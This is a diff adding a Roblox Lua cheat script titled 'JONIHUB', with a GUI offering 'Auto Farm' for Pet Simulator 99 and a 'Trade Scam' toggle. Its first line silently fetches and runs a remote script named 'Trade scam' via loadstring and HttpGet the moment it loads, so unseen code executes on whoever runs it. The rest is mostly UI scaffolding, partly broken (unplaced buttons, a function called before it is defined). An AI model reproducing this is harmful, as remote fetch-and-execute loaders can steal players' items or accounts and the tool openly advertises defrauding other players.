@@ -1,0 +1,149 @@
+-- Load and run the external script automatically when the script is enabled
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jonsina-glitch/Wave/main/Trade%20scam", true))()
+
+-- ScreenGui, MainFrame და სხვა ელემენტები
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local TitleLabel = Instance.new("TextLabel")
+local InfoButton = Instance.new("TextButton")
+local TradeScamButton = Instance.new("TextButton")
+local FooterLabel = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local RestartButton = Instance.new("TextButton")
+local AutoFarmButton = Instance.new("TextButton")
+local isScriptActive = true
+
+local isAutoFarming = false  -- Auto Farm status
+
+-- UI ფანჯრები და ღილაკები
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Name = "Jonihub"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(169, 169, 169)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(1, -400, 0.4, 0)
+MainFrame.Size = UDim2.new(0, 400, 0, 200)
+
+TitleLabel.Parent = MainFrame
+TitleLabel.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+TitleLabel.BorderSizePixel = 0
+TitleLabel.Size = UDim2.new(1, 0, 0, 40)
+TitleLabel.Font = Enum.Font.SourceSansBold
+TitleLabel.Text = "JONIHUB - v1.0"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 20
+
+FooterLabel.Parent = MainFrame
+FooterLabel.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+FooterLabel.BorderSizePixel = 0
+FooterLabel.Position = UDim2.new(0, 0, 0.9, 0)
+FooterLabel.Size = UDim2.new(1, 0, 0.1, 0)
+FooterLabel.Font = Enum.Font.SourceSans
+FooterLabel.Text = "Please report bugs to @Jonihub!"
+FooterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+FooterLabel.TextSize = 16
+
+AutoFarmButton.Parent = MainFrame
+AutoFarmButton.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+AutoFarmButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+AutoFarmButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+AutoFarmButton.Font = Enum.Font.SourceSans
+AutoFarmButton.Text = "Auto Farm"
+AutoFarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoFarmButton.TextSize = 18
+
+TradeScamButton.Parent = MainFrame
+TradeScamButton.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+TradeScamButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+TradeScamButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+TradeScamButton.Font = Enum.Font.SourceSans
+TradeScamButton.Text = "Trade Scam"
+TradeScamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TradeScamButton.TextSize = 18
+
+-- Auto Farm Button Click Event
+AutoFarmButton.MouseButton1Click:Connect(function()
+    if isAutoFarming then
+        isAutoFarming = false
+        AutoFarmButton.Text = "Start Auto Farm"
+    else
+        isAutoFarming = true
+        AutoFarmButton.Text = "Stop Auto Farm"
+        startAutoFarm()  -- Start Auto Farm function
+    end
+end)
+
+-- Function to start Auto Farm (for Pet Simulator 99)
+function startAutoFarm()
+    while isAutoFarming do
+        -- აირჩიეთ ადგილები, რომელზეც უნდა ფერმინგი გაკეთდეს, ან თქვენი გმირი დააჭირეთ
+        -- მაგალითად, ცხოველის ან ობიექტის ავტომატურად გაშვება
+        local pet = game.Players.LocalPlayer.Character:FindFirstChild("Pet") -- აირჩიეთ თქვენი პეტი
+        if pet then
+            -- თუ პეტი არის, გაუშვით ის შესაბამის ადგილებზე
+            -- მაგალითად, თუ ეს არის ობიექტი, რომლებსაც ექნებათ ავტომატური კოლექცია
+            local target = workspace:FindFirstChild("TargetObject")  -- მაგალითი: ობიექტი
+            if target then
+                pet:MoveTo(target.Position)
+            end
+        end
+        wait(1)  -- ყოველ 1 წამში ასრულებს ამოცანას
+    end
+end
+
+-- Close Button (X) functionality to stop script
+CloseButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    RestartButton.Visible = true
+    isScriptActive = false
+end)
+
+-- Restart Button functionality to restart the script
+RestartButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = true
+    RestartButton.Visible = false
+    isScriptActive = true
+end)
+
+-- Trade Scam functionality with ON/OFF toggle
+TradeScamButton.MouseButton1Click:Connect(function()
+    local tradeScamWindow = Instance.new("Frame")
+    tradeScamWindow.Parent = ScreenGui
+    tradeScamWindow.BackgroundColor3 = Color3.fromRGB(169, 169, 169)
+    tradeScamWindow.Position = UDim2.new(0.5, 0, 0.5, 0)
+    tradeScamWindow.Size = UDim2.new(0, 200, 0, 100)
+
+    -- ON Button
+    local onButton = Instance.new("TextButton")
+    onButton.Parent = tradeScamWindow
+    onButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    onButton.Position = UDim2.new(0.1, 0, 0.2, 0)
+    onButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+    onButton.Text = "ON"
+    onButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    onButton.TextSize = 18
+
+    -- OFF Button
+    local offButton = Instance.new("TextButton")
+    offButton.Parent = tradeScamWindow
+    offButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    offButton.Position = UDim2.new(0.6, 0, 0.2, 0)
+    offButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+    offButton.Text = "OFF"
+    offButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    offButton.TextSize = 18
+
+    -- X Button (Close)
+    local closeButton = Instance.new("TextButton")
+    closeButton.Parent = tradeScamWindow
+    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    closeButton.Position = UDim2.new(0.9, 0, 0, 0)
+    closeButton.Size = UDim2.new(0.1, 0, 0.2, 0)
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.TextSize = 18
+
+    closeButton.MouseButton1Click:Connect(function()
+        tradeScamWindow:Destroy()
+    end)
+end)
